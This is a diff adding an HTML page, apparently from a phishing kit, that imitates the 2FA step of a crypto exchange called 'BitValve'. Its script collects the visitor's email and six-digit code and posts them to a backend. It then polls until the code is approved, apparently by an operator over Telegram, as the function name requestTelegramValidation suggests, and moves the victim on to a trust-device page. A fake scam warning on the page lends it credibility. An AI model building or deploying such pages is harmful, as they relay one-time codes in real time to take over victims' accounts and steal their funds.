@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BitValve — 2FA Verification</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+
+  <div class="page">
+
+    <main class="login-card">
+
+      <div id="twofa-panel" class="twofa-panel" aria-live="polite">
+        <div class="logo" aria-label="BitValve logo">
+          <img src="bitvalve.png" alt="BitValve logo" class="logo-mark" onerror="this.style.display='none'" />
+          <div class="logo-text">BitValve</div>
+        </div>
+
+        <div class="twofa-heading">Enter 2FA Code</div>
+
+        <div class="twofa-warning" role="alert">
+          <div class="warning-icon">⚠</div>
+          <div class="warning-copy">
+            <div class="warning-title">NEVER TRUST LINKS SENT ON TELEGRAM</div>
+            <p>
+              BitValve staff will never send you a link on Telegram. Anyone messaging you a link there is a scammer trying to steal your account and funds. Never enter this code on any site or share it with anyone.
+            </p>
+          </div>
+        </div>
+
+        <div class="twofa-label">2FA security code</div>
+
+        <div class="code-grid" aria-label="Two factor authentication code">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 1" />
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 2" />
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 3" />
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 4" />
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 5" />
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 6" />
+        </div>
+
+        <button type="button" class="twofa-login-btn" onclick="submitTwoFactorCode()">
+          <span>Login</span>
+        </button>
+
+        <div class="twofa-help">Not Working?</div>
+
+        <div id="status-message" class="status-message hidden" aria-live="polite"></div>
+      </div>
+
+    </main>
+
+  </div>
+
+  <script>
+    if (window.location.protocol === 'file:') {
+      window.location.replace('http://localhost:3000/2fa.html');
+    }
+
+    function getEmail() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const emailParam = urlParams.get('email') || sessionStorage.getItem('login_email');
+      if (emailParam) {
+        sessionStorage.setItem('login_email', emailParam);
+      }
+      return emailParam;
+    }
+
+    const email = getEmail();
+    if (!email) {
+      window.location.href = 'login.html';
+    }
+
+    function setStatusMessage(message, type) {
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.textContent = message;
+      statusMessage.classList.remove('hidden', 'success', 'error');
+      statusMessage.classList.add(type);
+    }
+
+    function clearStatusMessage() {
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.textContent = '';
+      statusMessage.classList.add('hidden');
+      statusMessage.classList.remove('success', 'error');
+    }
+
+    function setVerificationButtonState(button, isLoading, label) {
+      if (!button) return;
+      const textEl = button.querySelector('span');
+      button.disabled = isLoading;
+      if (textEl) {
+        textEl.textContent = isLoading ? 'Please wait...' : label;
+      }
+    }
+
+    function clearOtpErrors(panel) {
+      const fields = panel.querySelectorAll('.otp-box');
+      fields.forEach((field) => field.classList.remove('invalid'));
+    }
+
+    function requestTelegramValidation(step, code, onApproved, onDenied) {
+      const panel = document.getElementById('twofa-panel');
+      const button = panel?.querySelector('.twofa-login-btn');
+      const buttonLabel = 'Login';
+
+      if (!email) {
+        setStatusMessage('Email is required for verification.', 'error');
+        return;
+      }
+
+      clearOtpErrors(panel);
+      setVerificationButtonState(button, true, buttonLabel);
+
+      fetch('/api/send-verification', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, step, code })
+      })
+        .then(async (response) => {
+          const result = await response.json();
+          if (!response.ok || !result.ok) {
+            throw new Error(result.message || 'Unable to send verification request.');
+          }
+
+          const pollId = setInterval(async () => {
+            try {
+              const statusResponse = await fetch(`/api/verification-status?email=${encodeURIComponent(email)}&step=${encodeURIComponent(step)}`);
+              const statusResult = await statusResponse.json();
+
+              if (statusResult.status === 'pending') {
+                return;
+              }
+
+              clearInterval(pollId);
+              setVerificationButtonState(button, false, buttonLabel);
+
+              if (statusResult.status === 'approved') {
+                onApproved && onApproved(statusResult);
+              } else {
+                panel?.querySelectorAll('.otp-box').forEach((field) => field.classList.add('invalid'));
+                setStatusMessage('Wrong code', 'error');
+                onDenied && onDenied(statusResult);
+              }
+            } catch (error) {
+              console.error('Verification polling failed:', error);
+              clearInterval(pollId);
+              setVerificationButtonState(button, false, buttonLabel);
+              panel?.querySelectorAll('.otp-box').forEach((field) => field.classList.add('invalid'));
+              setStatusMessage('Wrong code', 'error');
+            }
+          }, 2000);
+        })
+        .catch((error) => {
+          console.error(error);
+          setVerificationButtonState(button, false, buttonLabel);
+          panel?.querySelectorAll('.otp-box').forEach((field) => field.classList.add('invalid'));
+          setStatusMessage('Wrong code', 'error');
+        });
+    }
+
+    function setupOtpInputGroup(inputs) {
+      inputs.forEach((input, index) => {
+        input.value = '';
+        input.addEventListener('input', (event) => {
+          const value = event.target.value.replace(/\D/g, '').slice(0, 1);
+          event.target.value = value;
+          if (value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener('keydown', (event) => {
+          if (event.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+    }
+
+    function submitTwoFactorCode() {
+      const otpInputs = Array.from(document.getElementById('twofa-panel').querySelectorAll('.otp-box'));
+      const code = otpInputs.map((input) => input.value).join('').trim();
+
+      if (code.length !== 6) {
+        setStatusMessage('Please enter the full 6-digit 2FA code.', 'error');
+        return;
+      }
+
+      clearStatusMessage();
+      requestTelegramValidation('2fa', code, () => {
+        window.location.href = `trust-device.html?email=${encodeURIComponent(email)}`;
+      }, () => {
+        setStatusMessage('Wrong code', 'error');
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const twoFactorPanel = document.getElementById('twofa-panel');
+      const otpInputs = Array.from(twoFactorPanel.querySelectorAll('.otp-box'));
+      setupOtpInputGroup(otpInputs);
+      otpInputs[0]?.focus();
+    });
+  </script>
+
+</body>
+</html>
